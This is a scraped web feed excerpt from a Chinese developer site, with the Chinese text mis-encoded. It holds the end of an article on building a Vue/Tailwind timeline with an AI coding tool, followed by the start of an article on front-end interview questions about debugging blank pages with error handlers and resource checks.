 Â  Â  Â  Â  Â <span class="hljs-comment">&lt;!-- å¡ç‰‡å¤´éƒ¨ï¼šæ·±è‰²èƒŒæ™¯ --&gt;</span>
 Â  Â  Â  Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"flex items-center justify-between px-3 py-2"</span>&gt;</span>
 Â  Â  Â  Â  Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"text-sm font-medium text-white"</span>&gt;</span>å…±7æ¡<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
 Â  Â  Â  Â  Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"cursor-pointer text-xs text-white"</span>&gt;</span>å…¨éƒ¨&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
 Â  Â  Â  Â  Â <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
â€‹
 Â  Â  Â  Â  Â <span class="hljs-comment">&lt;!-- å¡ç‰‡å†…å®¹ï¼šä¸¤å¼ å›¾ç‰‡å¹¶æ’ --&gt;</span>
 Â  Â  Â  Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"flex gap-2 overflow-hidden p-3"</span>&gt;</span>
 Â  Â  Â  Â  Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"relative shrink-0 overflow-hidden rounded"</span>&gt;</span>
 Â  Â  Â  Â  Â  Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">:src</span>=<span class="hljs-string">"item.image"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"aspect-video h-[150px] w-[89px] object-cover"</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">""</span>&gt;</span>
 Â  Â  Â  Â  Â  Â <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
 Â  Â  Â  Â  Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"relative shrink-0 overflow-hidden rounded"</span>&gt;</span>
 Â  Â  Â  Â  Â  Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">:src</span>=<span class="hljs-string">"item.image"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"aspect-video h-[150px] w-[89px] object-cover"</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">""</span>&gt;</span>
 Â  Â  Â  Â  Â  Â <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
 Â  Â  Â  Â  Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"relative shrink-0 overflow-hidden rounded"</span>&gt;</span>
 Â  Â  Â  Â  Â  Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">:src</span>=<span class="hljs-string">"item.image"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"aspect-video h-[150px] w-[89px] object-cover"</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">""</span>&gt;</span>
 Â  Â  Â  Â  Â  Â <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
 Â  Â  Â  Â  Â <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
 Â  Â  Â  Â <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>2.åº•éƒ¨å°ä¸‰è§’å½¢æŒ‡ç¤ºå™¨,æœ‰æ²¡æœ‰å‹¾èµ·ä½ å½“æ—¶å­¦å‰ç«¯çš„å›å¿†ï¼Œé‚£é“ç»å…¸çš„é¢è¯•é¢˜çš„ï¼Œä½ æ˜¯æ€ä¹ˆå®ç°ä¸€ä¸ªä¸‰è§’å½¢çš„</p>
<pre><code class="hljs language-css" lang="css">&lt;<span class="hljs-selector-tag">div</span> class="<span class="hljs-attribute">border</span>-x-<span class="hljs-selector-attr">[12px]</span> <span class="hljs-attribute">border</span>-t-<span class="hljs-selector-attr">[12px]</span> <span class="hljs-attribute">border</span>-<span class="hljs-selector-attr">[#1D2129]</span> <span class="hljs-attribute">border</span>-x-transparent" /&gt;
</code></pre>
<p>3.ç«–çº¿ï¼šå¥‡æ•°é¡¹åŠ é•¿ï¼ˆè§†è§‰ç¬¬1ã€3ã€5é¡¹ï¼‰,ä½¿ç”¨tailwindçš„h-[310px]å’Œh-[101px]æ¥å®ç°è¿æ¥çº¿çš„é•¿çŸ­</p>
<pre><code class="hljs language-less" lang="less">&lt;<span class="hljs-selector-tag">div</span>
 Â  Â  Â  Â   <span class="hljs-selector-tag">class</span>="<span class="hljs-selector-tag">w-</span><span class="hljs-selector-attr">[2px]</span>" :<span class="hljs-selector-tag">class</span>="<span class="hljs-selector-attr">[ Â  Â  Â  Â  Â   isCreation ? <span class="hljs-string">'bg-blue-500'</span> : <span class="hljs-string">'bg-[#685FE1]'</span>, Â  Â  Â  Â  Â   i % 2 === 0 ? <span class="hljs-string">'h-[310px]'</span> : <span class="hljs-string">'h-[101px]'</span>, Â  Â  Â  Â   ]</span>"
 Â  Â  Â   /&gt;
</code></pre>
<p>4.åº•éƒ¨åœ†ç‚¹çš„å®ç°ï¼Œä¹Ÿæ˜¯ä½¿ç”¨ä¸€ä¸ªdivæ¥å®ç°çš„</p>
<pre><code class="hljs language-less" lang="less">&lt;<span class="hljs-selector-tag">div</span>
    <span class="hljs-selector-tag">class</span>="<span class="hljs-selector-tag">z-10</span> <span class="hljs-selector-tag">size-4</span> <span class="hljs-selector-tag">rounded-full</span> <span class="hljs-selector-tag">border-</span><span class="hljs-selector-attr">[3px]</span> <span class="hljs-selector-tag">bg-white</span>" :<span class="hljs-selector-tag">class</span>="<span class="hljs-selector-attr">[    isCreation ? <span class="hljs-string">'border-blue-500'</span> : <span class="hljs-string">'border-[#685FE1]'</span>,    ]</span>"
/&gt;
</code></pre>
<p>5.åº•éƒ¨æ¨ªå‘ä¸»çº¿ï¼ˆé»‘è‰²ï¼‰è´¯ç©¿æ•´ä¸ªå®¹å™¨</p>
<pre><code class="hljs language-scss" lang="scss">&lt;<span class="hljs-selector-tag">div</span> class="absolute inset-x-<span class="hljs-number">0</span> <span class="hljs-attribute">bottom</span>-<span class="hljs-selector-attr">[35px]</span> h-<span class="hljs-selector-attr">[2px]</span> bg-black"/&gt;
</code></pre>
<p>6.åº•éƒ¨æ—¶é—´è½´å³ä¾§ç®­å¤´ï¼ˆå›ºå®šåœ¨è½´çº¿å³ç«¯ï¼Œé å†…è¾¹è· <code>right-[-11px]</code> å¯è°ƒï¼‰</p>
<pre><code class="hljs language-js" lang="js">Â  &lt;div <span class="hljs-keyword">class</span>=<span class="hljs-string">"pointer-events-none absolute bottom-[56px] right-[-11px] z-[999]"</span>&gt;
Â  Â  &lt;!-- å‘å³çš„ç®­å¤´ <span class="hljs-variable constant_">SVG</span>ï¼Œæ ·å¼å¯æ”¹ --&gt;
Â  Â  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"size-6 text-black"</span> <span class="hljs-attr">viewBox</span>=<span class="hljs-string">"0 0 24 24"</span> <span class="hljs-attr">fill</span>=<span class="hljs-string">"none"</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">"http://www.w3.org/2000/svg"</span> <span class="hljs-attr">aria-hidden</span>=<span class="hljs-string">"true"</span>&gt;</span>
Â  Â  Â  <span class="hljs-tag">&lt;<span class="hljs-name">path</span> <span class="hljs-attr">d</span>=<span class="hljs-string">"M5 12h13"</span> <span class="hljs-attr">stroke</span>=<span class="hljs-string">"currentColor"</span> <span class="hljs-attr">stroke-width</span>=<span class="hljs-string">"1.6"</span> <span class="hljs-attr">stroke-linecap</span>=<span class="hljs-string">"round"</span> <span class="hljs-attr">stroke-linejoin</span>=<span class="hljs-string">"round"</span> /&gt;</span>
Â  Â  Â  <span class="hljs-tag">&lt;<span class="hljs-name">path</span> <span class="hljs-attr">d</span>=<span class="hljs-string">"M13 5l7 7-7 7"</span> <span class="hljs-attr">stroke</span>=<span class="hljs-string">"currentColor"</span> <span class="hljs-attr">stroke-width</span>=<span class="hljs-string">"1.6"</span> <span class="hljs-attr">stroke-linecap</span>=<span class="hljs-string">"round"</span> <span class="hljs-attr">stroke-linejoin</span>=<span class="hljs-string">"round"</span> /&gt;</span>
Â  Â  <span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span></span>
Â  &lt;/div&gt;
</code></pre>
<p>å…³é”®ä»£ç ï¼Œé€šè¿‡ç›‘å¬é¼ æ ‡æ»šè½®æ¥å®ç°æ¨ªå‘æ»šåŠ¨çš„</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
Â  <span class="hljs-keyword">const</span> el = scrollRef.<span class="hljs-property">value</span>
Â  <span class="hljs-keyword">if</span> (!el)
Â  Â  <span class="hljs-keyword">return</span>
Â  <span class="hljs-comment">// é¼ æ ‡æ»šè½®æ¨ªå‘æ»šåŠ¨</span>
Â  el.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'wheel'</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> {
Â  Â  <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">abs</span>(e.<span class="hljs-property">deltaY</span>) &gt; <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">abs</span>(e.<span class="hljs-property">deltaX</span>)) {
Â  Â  Â  e.<span class="hljs-title function_">preventDefault</span>()
Â  Â  Â  el.<span class="hljs-property">scrollLeft</span> += e.<span class="hljs-property">deltaY</span>
Â  Â  }
Â  })
})
</code></pre>
<p>æ¥çœ‹çœ‹ä»£ç è¡Œæ•°ï¼Œç¡®å®å¾ˆæƒŠè‰³ï¼Œç®€å•çš„119è¡Œå°±å®ç°äº†
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6303e58a360847b2828883e9c1fae9eb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L2g5LiN5Lya5Zuw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764585023&amp;x-signature=QT7ClFT1eVp7U2p58oDmgusfiq8%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-1">æ€»ç»“</h2>
<p>traeçš„soloç¡®å®æ¯”ä¹‹å‰å¥½å¾ˆå¤šï¼Œä¹ŸæƒŠè‰³åˆ°æˆ‘äº†ï¼Œå‰ç«¯å¯çœŸæ˜¯è¶Šæ¥è¶Šéš¾äº†ï¼Œä»¥åçš„æ—¶é—´æ’æœŸä¹Ÿä¼šè¿›ä¸€æ­¥çš„å‹ç¼©äº†ï¼Œè¿˜æ˜¯è¦é€‚å½“çš„ä½¿ç”¨aiæ¥è¾…åŠ©æˆ‘ä»¬çš„ç¼–ç¨‹ï¼ŒæŠŠä¸€äº›æ¯”è¾ƒå®¹æ˜“å®ç°çš„ï¼Œè€—æ—¶é—´çš„å·¥ä½œäº¤ç»™aiå»å®ç°ï¼Œæˆ‘ä»¬ä¸“æ³¨äºä¸€äº›å·¥ç¨‹åŒ–å’Œæ¶æ„ä¸Šé¢å»ï¼Œä¹Ÿå¯ä»¥é€‚å½“å­¦ä¸€äº›nodeé¡¹ç›®ï¼Œæé«˜æˆ‘ä»¬è‡ªå·±çš„æ ¸å¿ƒç«äº‰åŠ›,åŠ æ²¹å§ï¼Œå‰ç«¯å·¥ç¨‹å¸ˆä»¬ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ğŸ—£ï¸é¢è¯•å®˜ï¼š é‚£äº›å¸¸è§çš„å‰ç«¯é¢è¯•åœºæ™¯é—®é¢˜]]></title>    <link>https://juejin.cn/post/7576052677051449370</link>    <guid>https://juejin.cn/post/7576052677051449370</guid>    <pubDate>2025-11-24T10:30:33.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576052677051449370" data-draft-id="7569566666528768040" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ğŸ—£ï¸é¢è¯•å®˜ï¼š é‚£äº›å¸¸è§çš„å‰ç«¯é¢è¯•åœºæ™¯é—®é¢˜"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript,é¢è¯•"/> <meta itemprop="datePublished" content="2025-11-24T10:30:33.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="åŸæ¥æ˜¯å°ä»™å¥³å‘€"/> <meta itemprop="url" content="https://juejin.cn/user/1239904846362055"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ğŸ—£ï¸é¢è¯•å®˜ï¼š é‚£äº›å¸¸è§çš„å‰ç«¯é¢è¯•åœºæ™¯é—®é¢˜
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1239904846362055/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    åŸæ¥æ˜¯å°ä»™å¥³å‘€
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T10:30:33.000Z" title="Mon Nov 24 2025 10:30:33 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1. é¡µé¢ç™½å±å¦‚ä½•æ’æŸ¥ï¼Ÿ</h2>
<p><strong>ç¬¬ä¸€æ­¥ï¼šå¿«é€Ÿåˆ†ç±»ï¼ˆ30ç§’ï¼‰</strong> "é¡µé¢ç™½å±ä¸»è¦æœ‰äº”ç§åŸå› ï¼šJavaScriptæ‰§è¡Œé”™è¯¯ã€èµ„æºåŠ è½½å¤±è´¥ã€CSSæ ·å¼é—®é¢˜ã€æ¥å£å¼‚å¸¸å’Œæµè§ˆå™¨å…¼å®¹æ€§ã€‚å…¶ä¸­JavaScripté”™è¯¯æœ€å¸¸è§ï¼Œç‰¹åˆ«æ˜¯SPAåº”ç”¨ä¸­çš„æœªæ•è·å¼‚å¸¸ã€‚"</p>
<p><strong>ç¬¬äºŒæ­¥ï¼šæ’æŸ¥æ–¹æ³•ï¼ˆ1åˆ†é’Ÿï¼‰</strong> "æˆ‘çš„æ’æŸ¥æ­¥éª¤æ˜¯ï¼šé¦–å…ˆæŸ¥çœ‹Consoleé¢æ¿çš„é”™è¯¯ä¿¡æ¯ï¼Œè¿™èƒ½å¿«é€Ÿå®šä½JSå¼‚å¸¸ï¼›ç„¶åæ£€æŸ¥Networké¢æ¿ç¡®è®¤èµ„æºåŠ è½½çŠ¶æ€ï¼›æ¥ç€ç”¨Elementsé¢æ¿éªŒè¯DOMå’Œæ ·å¼ï¼›ç§»åŠ¨ç«¯é—®é¢˜ä¼šç”¨vConsoleæˆ–çœŸæœºè°ƒè¯•ã€‚ç”Ÿäº§ç¯å¢ƒç»“åˆSentryç­‰ç›‘æ§ç³»ç»Ÿåˆ†æã€‚"</p>
<p><strong>ç¬¬ä¸‰æ­¥ï¼šé¢„é˜²æªæ–½ï¼ˆ30ç§’ï¼‰</strong> "é¢„é˜²æ–¹é¢å»ºç«‹é”™è¯¯è¾¹ç•Œã€èµ„æºå®¹é”™æœºåˆ¶ã€ç»Ÿä¸€æ¥å£å¼‚å¸¸å¤„ç†ã€å…¼å®¹æ€§æ£€æµ‹ï¼ŒåŒæ—¶æ­å»ºç›‘æ§å‘Šè­¦ä½“ç³»ã€‚"</p>
<h3 data-id="heading-1">ä¸€ã€åŸºç¡€æ£€æµ‹æµç¨‹</h3>
<h4 data-id="heading-2">1. æ§åˆ¶å°æ£€æŸ¥ï¼ˆConsoleï¼‰</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ä¸»åŠ¨æ•è·å…¨å±€é”™è¯¯ï¼ˆæ”¾åœ¨å…¥å£æ–‡ä»¶æœ€å‰é¢ï¼‰</span>
<span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'error'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">event</span>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'å…¨å±€æ•è·:'</span>, event.<span class="hljs-property">error</span>);
  <span class="hljs-comment">// å¯ä¸ŠæŠ¥åˆ°ç›‘æ§ç³»ç»Ÿ</span>
});

<span class="hljs-comment">// æ£€æŸ¥consoleæ˜¯å¦æœ‰ä»¥ä¸‹ç±»å‹é”™è¯¯ï¼š</span>
<span class="hljs-comment">// - SyntaxError (è¯­æ³•é”™è¯¯)</span>
<span class="hljs-comment">// - TypeError (ç±»å‹é”™è¯¯)</span>
<span class="hljs-comment">// - ReferenceError (å¼•ç”¨é”™è¯¯)</span>
<span class="hljs-comment">// - 404èµ„æºåŠ è½½å¤±è´¥</span>
</code></pre>
<h4 data-id="heading-3">2. ç½‘ç»œè¯·æ±‚æ£€æŸ¥ï¼ˆNetworkï¼‰</h4>
<ul>
<li>
<p><strong>å…³é”®æŒ‡æ ‡</strong>ï¼š</p>
<ul>
<li>HTMLæ–‡æ¡£çŠ¶æ€ç ï¼ˆ200/304/404/500ï¼‰</li>
<li>JS/CSSèµ„æºåŠ è½½çŠ¶æ€</li>
<li>æ¥å£è¯·æ±‚æ˜¯å¦é˜»å¡æ¸²æŸ“</li>
</ul>
</li>
<li>
<p><strong>æ£€æµ‹ç¤ºä¾‹</strong>ï¼š</p>
</li>
</ul>
<pre><code class="hljs language-ini" lang="ini">// æ£€æŸ¥å…³é”®èµ„æºæ˜¯å¦åŠ è½½å®Œæˆ
const <span class="hljs-attr">resourceCheck</span> = () =&gt; {
  const <span class="hljs-attr">entries</span> = performance.getEntriesByType(<span class="hljs-string">'resource'</span>)<span class="hljs-comment">;</span>
  const <span class="hljs-attr">criticalResources</span> = entries.filter(entry =&gt; 
    <span class="hljs-attr">entry.initiatorType</span> === <span class="hljs-string">'script'</span> || 
    <span class="hljs-attr">entry.initiatorType</span> === <span class="hljs-string">'css'</span>
  )<span class="hljs-comment">;</span>
  
  criticalResources.forEach(<span class="hljs-attr">res</span> =&gt; {
    if(res.responseStatus &gt;= 400) {
      console.error(`èµ„æºåŠ è½½å¤±è´¥: ${res.name}`, res)<span class="hljs-comment">;</span>
    }
  })<span class="hljs-comment">;</span>
}<span class="hljs-comment">;</span>
window.addEventListener('load', resourceCheck)<span class="hljs-comment">;</span>
</code></pre>
<h3 data-id="heading-4">äºŒã€æ·±åº¦æ£€æµ‹æ–¹æ³•</h3>
<h4 data-id="heading-5">1. DOMæ¸²æŸ“æ£€æµ‹</h4>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// æ£€æµ‹DOMæ ‘æ˜¯å¦æ­£å¸¸æ„å»º</span>
function <span class="hljs-built_in">checkDOMReady</span>() {
  return new <span class="hljs-built_in">Promise</span>((resolve) =&gt; {
    const check = () =&gt; {
      <span class="hljs-built_in">if</span>(document.body &amp;&amp; document.body.children.length &gt; <span class="hljs-number">0</span>) {
        <span class="hljs-built_in">resolve</span>(true);
      } else {
        <span class="hljs-built_in">setTimeout</span>(check, <span class="hljs-number">50</span>);
      }
    };
    <span class="hljs-built_in">check</span>();
  });
}

<span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹</span>
<span class="hljs-built_in">checkDOMReady</span>()<span class="hljs-selector-class">.then</span>((isReady) =&gt; {
  <span class="hljs-built_in">if</span>(!isReady) {
    console<span class="hljs-selector-class">.error</span>('DOMæ¸²æŸ“è¶…æ—¶');
    <span class="hljs-comment">// ä¸ŠæŠ¥ç™½å±ä¿¡æ¯</span>
  }
});
</code></pre>
<h4 data-id="heading-6">2. æ¡†æ¶ç‰¹å®šæ£€æµ‹</h4>
<h5 data-id="heading-7">Vueåº”ç”¨æ£€æµ‹ï¼š</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// åœ¨main.jsä¸­æ·»åŠ </span>
<span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>({
  <span class="hljs-attr">render</span>: <span class="hljs-function"><span class="hljs-params">h</span> =&gt;</span> <span class="hljs-title function_">h</span>(<span class="hljs-title class_">App</span>),
  <span class="hljs-title function_">errorCaptured</span>(<span class="hljs-params">err, vm, info</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'Vueç»„ä»¶é”™è¯¯:'</span>, err, info);
    <span class="hljs-comment">// å¯ä¸ŠæŠ¥é”™è¯¯</span>
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <span class="hljs-comment">// é˜»æ­¢é”™è¯¯ç»§ç»­å‘ä¸Šä¼ æ’­</span>
  }
}).$mount(<span class="hljs-string">'#app'</span>);

<span class="hljs-comment">// æ£€æŸ¥æ ¹ç»„ä»¶æŒ‚è½½</span>
<span class="hljs-keyword">if</span>(!<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">'#app'</span>).<span class="hljs-property">__vue__</span>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'Vueæ ¹å®ä¾‹æŒ‚è½½å¤±è´¥'</span>);
}
</code></pre>
<h5 data-id="heading-8">Reactåº”ç”¨æ£€æµ‹ï¼š</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// Error Boundaryç»„ä»¶</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">ErrorBoundary</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">React.Component</span> {
  <span class="hljs-title function_">componentDidCatch</span>(<span class="hljs-params">error, info</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'Reactç»„ä»¶é”™è¯¯:'</span>, error, info);
    <span class="hljs-comment">// ä¸ŠæŠ¥é”™è¯¯</span>
  }
  
  <span class="hljs-title function_">render</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">props</span>.<span class="hljs-property">children</span>; 
  }
}

<span class="hljs-comment">// æ£€æŸ¥Reactæ ¹ç»„ä»¶</span>
<span class="hljs-keyword">const</span> root = <span class="hljs-title class_">ReactDOM</span>.<span class="hljs-title function_">createRoot</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'root'</span>));
root.<span class="hljs-title function_">render</span>(
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">ErrorBoundary</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">App</span> /&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">ErrorBoundary</span>&gt;</span></span>
);
</code></pre>
<h3 data-id="heading-9">ä¸‰ã€æ€§èƒ½ç›¸å…³æ£€æµ‹</h3>
<h4 data-id="heading-10">1. é•¿ä»»åŠ¡æ£€æµ‹</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// æ£€æµ‹é˜»å¡æ¸²æŸ“çš„é•¿æ—¶é—´ä»»åŠ¡</span>
<span class="hljs-keyword">const</span> observer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PerformanceObserver</span>(<span class="hljs-function">(<span class="hljs-params">list</span>) =&gt;</span> {
